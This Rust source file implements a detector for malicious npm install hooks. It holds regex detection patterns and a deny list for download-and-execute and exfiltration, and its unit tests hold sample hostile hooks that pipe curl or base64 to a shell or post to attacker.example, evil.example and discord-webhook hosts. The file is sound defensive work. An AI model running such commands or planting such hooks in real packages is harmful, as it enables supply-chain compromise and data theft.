//! Install-hook malware detector. Port of `install_hook.go` +
//! `check_install_hooks.go`.
//!
//! Flags [`Capability::InstallHookSuspicious`] when any declared
//! install-time / build-time lifecycle hook matches a known
//! malware-distribution shape: download-and-execute (`curl … | sh`),
//! inline `-e`/`-c` eval of a dangerous body, base64 piped to a shell,
//! a fetch to a known C2/exfil host, a silent-exit runner, or a
//! non-standard-runtime local-file runner. Split-string concatenation
//! (`"cur" + "l"`) is collapsed before matching so obfuscation can't hide
//! the payload.

use std::sync::OnceLock;

use aegis_domain::Capability;
use regex::Regex;

use crate::NormalizedPackage;

fn re(s: &str) -> Regex {
    Regex::new(s).unwrap()
}

/// "fetch and immediately execute" shell constructs — the canonical
/// install-time backdoor shape.
fn download_exec_patterns() -> &'static [Regex] {
    static R: OnceLock<Vec<Regex>> = OnceLock::new();
    R.get_or_init(|| {
        vec![
            // curl … | sh   (also bash/zsh/python/node/ruby/perl)
            re(r"(?i)\bcurl\b[^|;]+\|\s*(sh|bash|zsh|ksh|python\d?|node|ruby|perl)\b"),
            // wget … | sh
            re(r"(?i)\bwget\b[^|;]+\|\s*(sh|bash|zsh|ksh|python\d?|node|ruby|perl)\b"),
            // fetch (BSD/macOS) … | sh
            re(r"(?i)\bfetch\s+-[^|;]+\|\s*(sh|bash|zsh)\b"),
            // curl/wget to a temp file then executing it
            re(r"(?i)\b(curl|wget)\b[^;&|]+\s*&&\s*(sh|bash|chmod\s+\+x)\b"),
        ]
    })
}

/// Inline scripting from CLI flags. Group 1 = interpreter, group 2 = body.
fn inline_exec_patterns() -> &'static [Regex] {
    static R: OnceLock<Vec<Regex>> = OnceLock::new();
    R.get_or_init(|| {
        vec![
            re(r"\b(node)\s+(?:-e|--eval)\s+(.+)$"),
            re(r"\b(python\d?)\s+-c\s+(.+)$"),
            re(r"\b(ruby|perl)\s+-e\s+(.+)$"),
            re(r"\b(deno)\s+eval\s+(.+)$"),
        ]
    })
}

/// Short control-flow one-liners that are NOT download-execute payloads —
/// e.g. `node --eval "if (process.env.CI) process.exit(0)"` (husky CI-skip).
fn inline_benign_pattern() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r#"^[\s'"]*(?:if\s*\(?\s*)?process\.(?:env\.\w+|exit\s*\(\s*\d+\s*\)|argv|platform|version)"#)
    })
}

fn base64_piped_pattern() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r#"(?i)\b(echo|printf)\b\s+['"]?[A-Za-z0-9+/]{40,}={0,2}['"]?[^|]*\|\s*(base64\s+(-d|--decode)|openssl\s+base64\s+-d)"#)
    })
}

fn suspicious_hook_host_pattern() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r"(?i)\b(curl|wget|fetch)\b[^;|]*\b(pastebin\.com|paste\.ee|hastebin\.com|transfer\.sh|file\.io|0x0\.st|ngrok\.io|trycloudflare\.com|discord(?:app)?\.com/api/webhooks|api\.telegram\.org/bot)")
    })
}

/// Local-script runner followed by `&& exit N` — used to make npm silently
/// discard the hook's exit status, hiding that malware ran.
fn silent_exit_runner_pattern() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r"(?i)\b(bun|npx|deno)\s+(run\s+)?\S+\.(js|ts|mjs|cjs|tsx|jsx)\s*&&\s*exit\s+[0-9]+")
    })
}

/// Non-standard runtime invocation of a local script file (bun/deno/npx
/// running a `.js`/`.ts`/… file). Anomalous in a published package's
/// lifecycle scripts even without the silent-exit trick.
fn non_standard_runtime_pattern() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r"(?i)\b(?:bun\s+run\s+|deno\s+(?:run\s+)?|npx\s+)\S+\.(js|ts|mjs|cjs|tsx|jsx)")
    })
}

fn concat_join_pattern() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| re(r#"["']\s*\+\s*["']"#))
}

/// Deny-list substrings that, inside an inline `-e`/`-c` body, indicate real
/// risk: process spawning, dynamic require/import, network I/O, fs writes.
const INLINE_DANGER_SIGNALS: &[&str] = &[
    "require(",
    "import(",
    "child_process",
    "execSync",
    "spawn",
    "exec(",
    "fetch(",
    "http.",
    "https.",
    "net.",
    "fs.write",
    "writeFileSync",
    "createWriteStream",
    "atob(",
    "Buffer.from",
    "base64",
    "eval(",
    "Function(",
];

/// Anything longer is treated as opaque enough to warrant a human look.
const INLINE_LENGTH_THRESHOLD: usize = 120;

fn trim_matching_quotes(s: &str) -> &str {
    let b = s.as_bytes();
    if b.len() < 2 {
        return s;
    }
    let (first, last) = (b[0], b[b.len() - 1]);
    if (first == b'"' || first == b'\'') && first == last {
        return &s[1..s.len() - 1];
    }
    s
}

/// Decide whether a captured inline body (content after `-e`/`--eval`/`-c`)
/// deserves a flag. Short, deny-list-clean bodies pass.
fn inline_script_is_suspicious(body: &str) -> bool {
    let body = body.trim();
    let body = body.trim_end_matches(['&', '|', ';']);
    let body = body.trim();
    let body = trim_matching_quotes(body);
    if body.is_empty() {
        return false;
    }
    if body.len() > INLINE_LENGTH_THRESHOLD {
        return true;
    }
    if inline_benign_pattern().is_match(body) {
        return false;
    }
    INLINE_DANGER_SIGNALS.iter().any(|sig| body.contains(sig))
}

/// Collapse adjacent string-literal concatenations (`"cur" + "l"` → `"curl"`)
/// repeatedly until stable, handling chains like `"c"+"u"+"r"+"l"`.
fn deobfuscate_concat(body: &str) -> String {
    let mut body = body.to_string();
    for _ in 0..50 {
        let next = concat_join_pattern().replace_all(&body, "").into_owned();
        if next == body {
            break;
        }
        body = next;
    }
    body
}

fn match_malware_patterns(body: &str) -> bool {
    if download_exec_patterns().iter().any(|re| re.is_match(body)) {
        return true;
    }
    for re in inline_exec_patterns() {
        if let Some(caps) = re.captures(body) {
            let (Some(lang), Some(inner)) = (caps.get(1), caps.get(2)) else {
                continue;
            };
            // Only node gets the benign carve-out; python/ruby/perl/deno -e
            // payloads are rarely benign, so flag unconditionally.
            if lang.as_str() != "node" {
                return true;
            }
            if inline_script_is_suspicious(inner.as_str()) {
                return true;
            }
        }
    }
    if base64_piped_pattern().is_match(body) {
        return true;
    }
    if suspicious_hook_host_pattern().is_match(body) {
        return true;
    }
    if silent_exit_runner_pattern().is_match(body) {
        return true;
    }
    if non_standard_runtime_pattern().is_match(body) {
        return true;
    }
    false
}

/// True when a shell-snippet matches any download-execute / inline-eval /
/// base64-piped / suspicious-host / silent-exit / non-standard-runtime
/// pattern. Checks the body verbatim and with split-string concatenations
/// collapsed.
pub fn script_matches_malware_pattern(body: &str) -> bool {
    let body = body.trim();
    if body.is_empty() {
        return false;
    }
    if match_malware_patterns(body) {
        return true;
    }
    let d = deobfuscate_concat(body);
    d != body && match_malware_patterns(&d)
}

/// Fires when any declared install/build hook matches a known malware pattern.
pub fn check_install_hooks(pkg: &NormalizedPackage) -> Vec<Capability> {
    if pkg
        .hooks
        .iter()
        .any(|h| script_matches_malware_pattern(&h.body))
    {
        return vec![Capability::InstallHookSuspicious];
    }
    Vec::new()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::manifest::parse_npm_manifest;
    use std::collections::HashMap;

    fn hooks_from(manifest: &str) -> NormalizedPackage {
        parse_npm_manifest("", manifest.as_bytes(), HashMap::new())
    }

    fn flags(scripts_json: &str) -> bool {
        let manifest = format!(r#"{{"scripts": {scripts_json}}}"#);
        !check_install_hooks(&hooks_from(&manifest)).is_empty()
    }

    #[test]
    fn malicious_hooks_flagged() {
        let bad = [
            r#"{"postinstall": "curl -sSL http://attacker.example/payload | sh"}"#,
            r#"{"postinstall": "wget -qO- http://x/y | bash"}"#,
            r#"{"install": "node -e \"require('child_process').exec('curl ...')\""}"#,
            r#"{"postinstall": "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"x\")'"}"#,
            r#"{"postinstall": "echo Y3VybCBodHRwczovL2F0dGFja2VyLmNvbXxiYXNo | base64 -d | sh"}"#,
            r#"{"postinstall": "curl -X POST https://discord.com/api/webhooks/111/aaa -d x"}"#,
            r#"{"install": "curl http://abc.ngrok.io/payload | sh"}"#,
            r#"{"postinstall": "node -e \"require('https').get('https://x.com/p')\""}"#,
        ];
        for s in bad {
            assert!(flags(s), "should flag: {s}");
        }
    }

    #[test]
    fn node_eval_long_opaque_body_flagged() {
        let long = "a".repeat(130);
        let s = format!(r#"{{"postinstall": "node -e \"{long}\""}}"#);
        assert!(flags(&s));
    }

    #[test]
    fn legit_hooks_not_flagged() {
        let good = [
            r#"{"postinstall": "node-gyp rebuild"}"#,
            r#"{"postinstall": "patch-package"}"#,
            r#"{"postinstall": "husky install"}"#,
            r#"{"prepare": "node --eval \"if (process.env.CI) process.exit(0)\" && husky || true"}"#,
            r#"{"prepare": "node -e \"process.exit(0)\""}"#,
            // curl in `test` isn't an install-time hook — parser drops it
            r#"{"test": "curl localhost | jest"}"#,
        ];
        for s in good {
            assert!(!flags(s), "should NOT flag: {s}");
        }
    }

    #[test]
    fn nonstandard_runtime_and_silent_exit_flagged() {
        let bad = [
            r#"{"prepare": "bun run tanstack_runner.js && exit 1"}"#,
            r#"{"postinstall": "bun run setup.js && exit 0"}"#,
            r#"{"postinstall": "npx run payload.mjs && exit 1"}"#,
            r#"{"postinstall": "deno run payload.ts && exit 1"}"#,
            r#"{"postinstall": "bun run install_hook.js"}"#,
            r#"{"postinstall": "deno run payload.ts"}"#,
        ];
        for s in bad {
            assert!(flags(s), "should flag: {s}");
        }
    }

    #[test]
    fn bun_deno_install_are_legit() {
        assert!(!flags(r#"{"prepare": "bun install"}"#));
        assert!(!flags(r#"{"prepare": "deno install"}"#));
    }

    #[test]
    fn no_scripts_no_signal() {
        assert!(check_install_hooks(&hooks_from(r#"{"name": "x"}"#)).is_empty());
        // broken JSON → no hooks → no signal
        assert!(check_install_hooks(&hooks_from("{ not json")).is_empty());
    }

    #[test]
    fn defeats_concat_obfuscation() {
        let bad = [
            r#""cur" + "l -fsSL http://evil.example/x.sh | sh""#,
            r#""cu"+"rl htt"+"p://evil.example | ba"+"sh""#,
            r#"'curl http://evil.example | ' + 'sh'"#,
        ];
        for s in bad {
            assert!(script_matches_malware_pattern(s), "expected match: {s}");
        }
        let good = [
            r#"console.log("hello " + "world")"#,
            r#""build" + "/output""#,
        ];
        for s in good {
            assert!(!script_matches_malware_pattern(s), "false positive: {s}");
        }
    }
}
